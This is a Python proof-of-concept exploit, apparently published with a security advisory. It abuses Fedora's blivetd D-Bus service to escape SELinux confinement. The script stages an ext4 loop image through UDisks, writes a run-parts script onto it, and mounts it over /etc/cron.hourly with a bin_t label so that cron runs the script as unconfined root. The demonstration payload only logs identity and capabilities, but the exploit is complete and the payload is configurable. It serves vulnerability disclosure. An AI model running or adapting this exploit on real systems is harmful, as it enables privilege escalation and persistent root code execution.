#!/usr/bin/env python3
#
# LinnemanLabs - Blivet PoC (cron.hourly overlay) - Fedora only
#
# https://linnemanlabs.com/posts/confined-root-is-still-root/
# https://github.com/linnemanlabs/advisories/
#
# blivetd (com.redhat.Blivet0) is gated only by a root-only D-Bus policy (<policy user="root">)
# no polkit, no forced MS_NOSUID, any mountpoint.
#
# a confined daemon can mount an attacker filesystem anywhere with any options, where UDisks
# would force nosuid,nodev and force mounts to go under /run/media etc.
#
# Self-contained PoC: UDisks stages the loop+ext4 (dd is bin_t, losetup/mkfs/udisksctl are
# fsadm_exec_t/devicekit_exec_t = not exec'able from a confined domain), then blivet does one
# Reset and - reusing the same Format object, so no 2nd Reset - mounts rw under our own writable
# label to drop the payload, Teardown, and overlays /etc/cron.hourly.
#
# Can create image off-site and skip the rw mount+staging steps. Most domains that can use blivetd
# can also use UDisks2 for this PoC.
#
# reliability: Reset()'s D-Bus-object teardown gets a little flaky if you run a ton of tests.
#
# you must set the STATE dir and PRELABEL for the specific domain you are escaping.
#
import os, sys, dbus
def log(m): print(m, flush=True)

# set to a directory you can write from your confined domain
STATE = "/var/lib/bluetooth"
# our writable label, so the confined caller can drop the payload
PRELABEL = "system_u:object_r:bluetooth_var_lib_t:s0"
# image to write. can leave default
IMG  = STATE + "/blivet_poc.img"
# the payload: a run-parts script - same logger pattern as the cron.d PoCs, as a script for cron.hourly
PAYLOAD = '#!/bin/sh\n{ id; grep ^Cap /proc/self/status } > /tmp/blivet.out\n'
# target mount point
MP   = sys.argv[1] if len(sys.argv) > 1 else "/etc/cron.hourly"
# overlay label (bin_t for cron.hourly)
CTX  = sys.argv[2] if len(sys.argv) > 2 else "system_u:object_r:bin_t:s0"
bus = dbus.SystemBus()

# stage loop + ext4 via UDisks D-Bus
U = "org.freedesktop.UDisks2"
mgr = dbus.Interface(bus.get_object(U, "/org/freedesktop/UDisks2/Manager", introspect=False), U + ".Manager")
os.system("dd if=/dev/zero of=%s bs=1M count=32 2>/dev/null" % IMG)
loop = mgr.LoopSetup(dbus.types.UnixFd(os.open(IMG, os.O_RDWR)), dbus.Dictionary({}, signature="sv"))
dbus.Interface(bus.get_object(U, loop, introspect=False), U + ".Block").Format("ext4", dbus.Dictionary({}, signature="sv"))
name = str(loop).split("/")[-1]
log("[+] staged /dev/%s (ext4) via UDisks" % name)

# blivet: one Reset, then Setup(rw)->write->Teardown->Setup(overlay) on the same Format object
BL = "com.redhat.Blivet0"
blv = dbus.Interface(bus.get_object(BL, "/com/redhat/Blivet0/Blivet", introspect=False), BL + ".Blivet")
log("[*] blivet Reset (activates daemon+scans - occasionally slow ~10s) ...")
try:
    blv.Reset()
except dbus.DBusException:
    # Reset's D-Bus-object teardown bug is non-fatal
    # device scan still populates, ResolveDevice works below
    pass
dev = blv.ResolveDevice(name)
props = dbus.Interface(bus.get_object(BL, dev, introspect=False), "org.freedesktop.DBus.Properties")
fmt = dbus.Interface(bus.get_object(BL, props.Get(BL + ".Device", "Format"), introspect=False), BL + ".Format")

# mount rw under our writable label, drop the run-parts payload, unmount
fmt.Setup(dbus.Dictionary({"mountpoint": dbus.String("/mnt/blivetprep"), "options": dbus.String("context=" + PRELABEL)}, signature="sv"))
open("/mnt/blivetprep/0blivet_poc", "w").write(PAYLOAD); os.chmod("/mnt/blivetprep/0blivet_poc", 0o755)
fmt.Teardown()
log("[+] wrote run-parts payload onto the image")

# overlay it over /etc/cron.hourly with context=bin_t so run-parts (system_cronjob_t) execs it
fmt.Setup(dbus.Dictionary({"mountpoint": dbus.String(MP), "options": dbus.String("context=" + CTX)}, signature="sv"))
log("[+] blivet overlaid %s (context=%s)" % (MP, CTX))
os.system(f'stat --format="%A %U %G %C %n" {MP}/0blivet_poc 2>/dev/null')
log("[*] run-parts %s runs 0blivet_poc hourly. check /tmp/blivet.out at the next hour :01" % MP)
log("[*] cleanup (root): umount %s ; losetup -d /dev/%s ; rm %s" % (MP, name, IMG))
